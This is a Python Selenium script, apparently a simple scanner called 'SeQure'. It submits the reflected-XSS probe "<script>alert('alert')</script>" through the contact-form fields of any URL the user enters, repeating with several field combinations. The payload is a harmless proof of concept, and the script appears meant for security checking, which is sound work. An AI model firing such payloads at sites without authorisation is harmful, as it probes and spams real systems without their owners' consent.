from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
import time
import os


def reflectedCrossSite(url):
    try:
        s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
        driver = webdriver.Chrome(service=s) # path to chromedriver
        driver.get(url)
        # This finds the element and passes in a script
        driver.find_element(By.NAME, 'your-name').send_keys("<script>alert('alert')</script>")
        driver.find_element(By.NAME, 'your-message').send_keys("Message trial #2")
        print("\n\t [+] HTML elements found:\n")
        # this finds the button
        button = driver.find_element(By.XPATH, "//input[@type='submit']")
        time.sleep(10) # sleeps for 5 seconds
        # this clicks the button
        driver.execute_script("arguments[0].click();", button)
        print("\n\t [+] Button was successfully pressed:\n")
        time.sleep(10) # sleeps for 5 seconds
        driver.quit() # closes the window
    except:
        print("\n\t [+] Element does not exist.")
    try:
        s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
        driver = webdriver.Chrome(service=s) # path to chromedriver
        driver.get(url)
        # This finds the element and passes in a script
        driver.find_element(By.NAME, 'your-name').send_keys("<script>alert('alert')</script>")
        driver.find_element(By.NAME, 'your-subject').send_keys("Message trial #2")
        print("\n\t [+] HTML elements found:\n")
        # this finds the button
        button = driver.find_element(By.XPATH, "//input[@type='submit']")
        time.sleep(10) # sleeps for 5 seconds
        # this clicks the button
        driver.execute_script("arguments[0].click();", button)
        print("\n\t [+] Button was successfully pressed:\n")
        time.sleep(10) # sleeps for 5 seconds
        driver.quit() # closes the window
    except:
        print("\n\t [+] Element does not exist.")
    try:
        s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
        driver = webdriver.Chrome(service=s) # path to chromedriver
        driver.get(url)
        # This finds the element and passes in a script
        driver.find_element(By.NAME, 'your-message').send_keys("<script>alert('alert')</script>")
        driver.find_element(By.NAME, 'your-subject').send_keys("Message trial #2")
        print("\n\t [+] HTML elements found:\n")
        # this finds the button
        button = driver.find_element(By.XPATH, "//input[@type='submit']")
        time.sleep(10) # sleeps for 5 seconds
        # this clicks the button
        driver.execute_script("arguments[0].click();", button)
        print("\n\t [+] Button was successfully pressed:\n")
        time.sleep(10) # sleeps for 5 seconds
        driver.quit() # closes the window
    except:
        print("\n\t [+] Element does not exist.")
    try:
        s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
        driver = webdriver.Chrome(service=s) # path to chromedriver
        driver.get(url)
        # This finds the element and passes in a script
        driver.find_element(By.NAME, 'your-subject').send_keys("Message trial #2")
        driver.find_element(By.NAME, 'your-message').send_keys("<script>alert('alert')</script>")
        print("\n\t [+] HTML elements found:\n")
        # this finds the button
        button = driver.find_element(By.XPATH, "//input[@type='submit']")
        time.sleep(10) # sleeps for 5 seconds
        # this clicks the button
        driver.execute_script("arguments[0].click();", button)
        print("\n\t [+] Button was successfully pressed:\n")
        time.sleep(10) # sleeps for 5 seconds
        driver.quit() # closes the window
    except:
        print("\n\t [+] Element does not exist.")
    try:
        s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
        driver = webdriver.Chrome(service=s) # path to chromedriver
        driver.get(url)
        # This finds the element and passes in a script
        driver.find_element(By.NAME, 'your-name').send_keys("<script>alert('alert')</script>")
        driver.find_element(By.NAME, 'your-subject').send_keys("Message trial #2")
        driver.find_element(By.NAME, 'your-email').send_keys("Message trial #2")
        print("\n\t [+] HTML elements found:\n")
        # this finds the button
        button = driver.find_element(By.XPATH, "//input[@type='submit']")
        time.sleep(10) # sleeps for 5 seconds
        # this clicks the button
        driver.execute_script("arguments[0].click();", button)
        print("\n\t [+] Button was successfully pressed:\n")
        time.sleep(10) # sleeps for 5 seconds
        driver.quit() # closes the window
    except:
        print("\n\t [+] Element does not exist.")

if __name__ == "__main__":
    clear = lambda: os.system('cls')
    clear() # clear screen
    print("[+] Welcome to SeQure!\n") # starting prompt
    url = input("[+] Enter the URL you would like to check: ")
    print("------------------------------------------------------------------------------------------")
    reflectedCrossSite(url)